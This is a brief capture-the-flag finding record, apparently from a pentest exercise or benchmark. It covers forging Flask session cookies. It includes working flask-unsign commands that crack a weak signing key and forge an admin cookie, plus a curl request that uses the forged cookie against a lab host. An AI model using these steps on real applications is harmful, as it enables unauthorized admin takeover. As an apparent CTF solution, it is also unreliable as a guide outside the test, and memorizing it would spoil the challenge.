findings.title: Flask Session Cookie Forgery - Admin Account Takeover
findings.description: The Flask application uses a weak secret key 'supersecretkey' to sign session cookies. An attacker can decode the session cookie, forge a new cookie with username 'admin', and gain full admin access. The admin profile page contains the CTF flag.

reproduction.command:
flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6ImhhY2tlciJ9.ad7AqQ.Ju3SvKpjDmVMTJA-2jPZuHhDpEs' --wordlist /tmp/flask_wordlist.txt --no-literal-eval
# Found secret key: supersecretkey
flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'supersecretkey' --no-literal-eval
# Forged cookie: eyJ1c2VybmFtZSI6ImFkbWluIn0.ad7CmA.r1zgdtDoGQakEJN7VHKW6ePZmfk
curl -b 'session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ad7CmA.r1zgdtDoGQakEJN7VHKW6ePZmfk' http://172.17.0.1:49553/profile
